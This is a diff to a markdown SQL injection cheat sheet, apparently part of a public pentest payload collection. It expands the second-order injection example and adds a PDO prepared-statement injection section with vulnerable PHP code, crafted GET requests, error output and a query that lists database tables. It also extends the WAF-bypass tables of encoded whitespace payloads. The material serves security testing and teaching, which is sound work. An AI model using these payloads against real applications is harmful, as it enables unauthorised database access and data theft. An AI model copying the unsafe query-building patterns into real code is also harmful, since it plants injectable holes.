@@ -29,8 +29,9 @@
 * [Polyglot Injection](#polyglot-injection)
 * [Routed Injection](#routed-injection)
 * [Second Order SQL Injection](#second-order-sql-injection)
+* [PDO Prepared Statements](#pdo-prepared-statements)
 * [Generic WAF Bypass](#generic-waf-bypass)
-    * [White Spaces](#white-spaces)
+    * [No Space Allowed](#no-space-allowed)
     * [No Comma Allowed](#no-comma-allowed)
     * [No Equal Allowed](#no-equal-allowed)
     * [Case Modification](#case-modification)
@@ -357,40 +358,135 @@ In short, the result of the first SQL query is used to build the second SQL quer
 ## Second Order SQL Injection
 
 Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
+Unlike first-order SQLi, the injection doesn’t happen right away. It is **triggered in a separate step**, often in a different part of the application.
 
-```py
-username="anything' UNION SELECT Username, Password FROM Users;--"
-password="P@ssw0rd"
-```
+1. User submits input that is stored (e.g., during registration or profile update).
 
-Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.
+   ```text
+   Username: attacker'--
+   Email: attacker@example.com
+   ```
+
+2. That input is saved **without validation** but doesn't trigger a SQL injection.
+
+   ```sql
+   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
+   ```
+
+3. Later, the application retrieves and uses the stored data in a SQL query.
+
+   ```python
+   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
+   ```
+
+4. If this query is built unsafely, the injection is triggered.
+
+## PDO Prepared Statements
+
+PDO, or PHP Data Objects, is an extension for PHP that provides a consistent and secure way to access and interact with databases. It is designed to offer a standardized approach to database interaction, allowing developers to use a consistent API across multiple types of databases like MySQL, PostgreSQL, SQLite, and more.
+
+PDO allows for binding of input parameters, which ensures that user data is properly sanitized before being executed as part of a SQL query. However it might still be vulnerable to SQL injections if the developers allowed user input inside the SQL query.
+
+**Requirements**:
+
+* DMBS
+    * **MySQL** is vulnerable by default.
+    * **Postgres** is not vulnerable by default, unless the emulation is turned on with `PDO::ATTR_EMULATE_PREPARES => true`.
+    * **SQLite** is not vulnerable to this attack.
+
+* SQL injection anywhere inside a PDO statement: `$pdo->prepare("SELECT $INJECT_SQL_HERE...")`.
+* PDO used for another SQL parameter, either with `?` or `:parameter`.
+
+    ```php
+    $pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);
+    $col = '`' . str_replace('`', '``', $_GET['col']) . '`';
+
+    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = ?");
+    $stmt->execute([$_GET['name']]);
+    // or
+    $stmt = $pdo->prepare("SELECT $col FROM animals WHERE name = :name");
+    $stmt->execute(['name' => $_GET['name']]);
+    ```
+
+**Methodology**:
+
+**NOTE**: In PHP 8.3 and lower, the injection happens even without a null byte (`\0`). The attacker only needs to smuggle a "`:`" or a "`?`".
+
+* Detect the SQLi using `?#\0`: `GET /index.php?col=%3f%23%00&name=anything`
+
+    ```ps1
+    # 1st Payload: ?#\0
+    # 2nd Payload: anything
+    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1
+    ```
+
+* Force a select \`'x\` instead of a column name and create a comment. Inject a backtick to fix the column and terminate the SQL query with `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`
+
+    ```ps1
+    # 1st Payload: ?#\0
+    # 2nd Payload: x`;#
+    Column not found: 1054 Unknown column ''x' in 'SELECT'
+    ```
+
+* Inject in second parameter the payload. `GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`
+
+    ```ps1
+    # 1st Payload: \?#\0
+    # 2nd Payload: x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
+    ALL_PLUGINS
+    APPLICABLE_ROLES
+    CHARACTER_SETS
+    CHECK_CONSTRAINTS
+    COLLATIONS
+    COLLATION_CHARACTER_SET_APPLICABILITY
+    COLUMNS
+    ```
+
+* Final SQL queries
+
+    ```SQL
+    -- Before $pdo->prepare
+    SELECT `\?#\0` FROM animals WHERE name = ?
+
+    -- After $pdo->prepare
+    SELECT `\'x` FROM (SELECT table_name AS `\'x` from information_schema.tables)y;#'#\0` FROM animals WHERE name = ?
+    ```
 
 ## Generic WAF Bypass
 
-### White Spaces
+---
 
-Bypass using whitespace alternatives.
+### No Space Allowed
 
-| Bypass                   | Technique              |
-| ------------------------ | ---------------------- |
-| `?id=1%09and%091=1%09--` | Whitespace alternative |
-| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |
-| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |
-| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |
-| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |
-| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
-| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+Some web applications attempt to secure their SQL queries by blocking or stripping space characters to prevent simple SQL injection attacks. However, attackers can bypass these filters by using alternative whitespace characters, comments, or creative use of parentheses.
 
-| DBMS       | ASCII characters in hexadecimal |
-| ---------- | ------------------------------- |
-| SQLite3    | 0A, 0D, 0C, 09, 20 |
-| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
-| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
-| PostgreSQL | 0A, 0D, 0C, 09, 20 |
-| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
-| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
+#### Alternative Whitespace Characters
 
-Bypass using comments and parenthesis.
+Most databases interpret certain ASCII control characters and encoded spaces (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade space-based filters.
+
+| Example Payload               | Description                      |
+|-------------------------------|----------------------------------|
+| `?id=1%09and%091=1%09--`      | `%09` is tab (`\t`)              |
+| `?id=1%0Aand%0A1=1%0A--`      | `%0A` is line feed (`\n`)        |
+| `?id=1%0Band%0B1=1%0B--`      | `%0B` is vertical tab            |
+| `?id=1%0Cand%0C1=1%0C--`      | `%0C` is form feed               |
+| `?id=1%0Dand%0D1=1%0D--`      | `%0D` is carriage return (`\r`)  |
+| `?id=1%A0and%A01=1%A0--`      | `%A0` is non-breaking space      |
+
+**ASCII Whitespace Support by Database**:
+
+| DBMS         | Supported Whitespace Characters (Hex)            |
+|--------------|--------------------------------------------------|
+| SQLite3      | 0A, 0D, 0C, 09, 20                               |
+| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |
+| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
+| PostgreSQL   | 0A, 0D, 0C, 09, 20                               |
+| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |
+| MSSQL        | 01–1F, 20                                        |
+
+#### Bypassing with Comments and Parentheses
+
+SQL allows comments and grouping, which can break up keywords and queries, thus defeating space filters:
 
 | Bypass                                    | Technique            |
 | ----------------------------------------- | -------------------- |
@@ -461,12 +557,13 @@ Bypass using keywords case insensitive or an equivalent operator.
 
 ## References
 
+* [A Novel Technique for SQL Injection in PDO’s Prepared Statements - Adam Kues - July 21, 2025](https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements)
 * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
 * [Implement a Blind Error-Based SQLMap payload for SQLite - soka - August 24, 2023](https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)
 * [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
 * [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://sqlwiki.netspi.com/)
 * [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
 * [SQLi Cheatsheet - NetSparker - March 19, 2022](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-* [SQLi in INSERT worse than SELECT - Mathias Karlsson - Feb 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
+* [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
 * [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
 * [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection)
